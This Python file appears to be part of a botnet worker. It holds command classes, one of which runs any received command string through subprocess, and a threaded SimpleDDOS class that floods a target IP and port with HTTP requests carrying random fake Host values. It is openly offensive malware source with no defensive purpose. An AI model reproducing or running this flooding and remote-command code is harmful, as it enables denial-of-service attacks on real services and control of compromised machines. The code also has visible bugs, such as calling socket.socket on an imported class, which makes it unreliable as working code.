import subprocess
from abc import ABC, abstractmethod
from random import randint
from concurrent.futures import ThreadPoolExecutor, as_completed
from socket import socket
from typing import Protocol


class Command(Protocol):
    _status: bool

    @property
    def status(self):
        return self._status

    def run(self):
        raise NotImplementedError()


class Die:
    def __init__(self, worker):
        self._status = None
        self.worker = worker

    @property
    def status(self):
        return self._status

    def run(self):
        self.worker.die()
        self._status = True


class Disconnect:
    def __init__(self, worker):
        self._status = None
        self.worker = worker

    @property
    def status(self):
        return self._status

    def run(self):
        self.worker.disconnect()
        self._status = True


class UnknownCommand:
    def __init__(self, command):
        self._status = None
        self.command = command

    @property
    def status(self):
        return self._status

    def run(self):
        process = subprocess.run(self.command.split())
        self._status = True if process.returncode == 0 else False


class DDOS(ABC):
    MAX_ATTACKS_IN_EACH_THREAD = 10

    def __init__(self, destination_ip, destination_port, max_number_of_attacks, *args, **kwargs):
        self.max_number_of_attacks = int(max_number_of_attacks)
        self.max_threads_count = self._calculate_number_of_threads()
        self.destination_ip = destination_ip
        self.destination_port = int(destination_port)
        self.fake_ip = self.fake_ip_generator()
        self._status = False
        super().__init__(*args, **kwargs)

    @property
    def status(self):
        return self._status

    def fake_ip_generator(self):
        fake_ip = ".".join(str(randint(0, 255)) for _ in range(4))
        if fake_ip.startswith('127'):
            return self.fake_ip_generator()
        else:
            return fake_ip

    def _calculate_number_of_threads(self):
        if self.max_number_of_attacks <= self.MAX_ATTACKS_IN_EACH_THREAD:
            return 1
        else:
            threads_count = (self.max_number_of_attacks // self.MAX_ATTACKS_IN_EACH_THREAD) + 1
            return threads_count

    @abstractmethod
    def run(self):
        pass


class SimpleDDOS(DDOS):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def attack(self, number_of_attacks):
        for i in range(number_of_attacks):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.destination_ip, self.destination_port))
            s.sendto(("GET /" + self.destination_ip + " HTTP/1.1\r\n").encode('ascii'),
                     (self.destination_ip, self.destination_port))
            s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'),
                     (self.destination_ip, self.destination_port))
            s.close()

    def run(self):
        thread_pool = ThreadPoolExecutor(max_workers=self.max_threads_count)
        futures = []
        total_number_of_attacks = self.max_number_of_attacks

        for _ in range(self.max_threads_count):
            if total_number_of_attacks >= self.MAX_ATTACKS_IN_EACH_THREAD:
                total_number_of_attacks -= self.MAX_ATTACKS_IN_EACH_THREAD
                number_of_attacks = self.MAX_ATTACKS_IN_EACH_THREAD
            else:
                number_of_attacks = total_number_of_attacks
            futures.append(thread_pool.submit(self.attack, number_of_attacks))
            for future in as_completed(futures):
                result = future.result()
        self._status = True
